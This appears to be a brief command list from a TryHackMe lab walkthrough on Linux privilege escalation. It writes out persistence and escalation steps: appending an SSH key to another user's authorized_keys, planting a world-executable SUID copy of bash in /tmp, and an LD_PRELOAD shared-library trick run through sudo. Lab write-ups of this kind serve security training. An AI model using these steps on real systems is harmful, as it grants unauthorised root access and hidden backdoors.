## commands used on TryHackMe room Linux Privilege Escalation: Automation https://tryhackme.com/room/linprivautomation
## YouTube video walk through: https://youtu.be/BMo4iDN57ko

```
ssh-keygen  -f john_rsa -C "Challenge-Frank"
```
```
mkdir -p /home/frank/.ssh
echo "ssh-ed25519 AAAAC3NzaC1*****1GAcu72b Challenge-Frank" >> /home/frank/.ssh/authorized_keys
chmod 700 /home/frank/.ssh
chmod 600 /home/frank/.ssh/authorized_keys
```

```
cp /bin/bash /tmp/bash_suid
chmod 4777 /tmp/bash_suid
```

```
gcc -fPIC -shared -o /tmp/libshell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/libshell.so /usr/bin/id
```
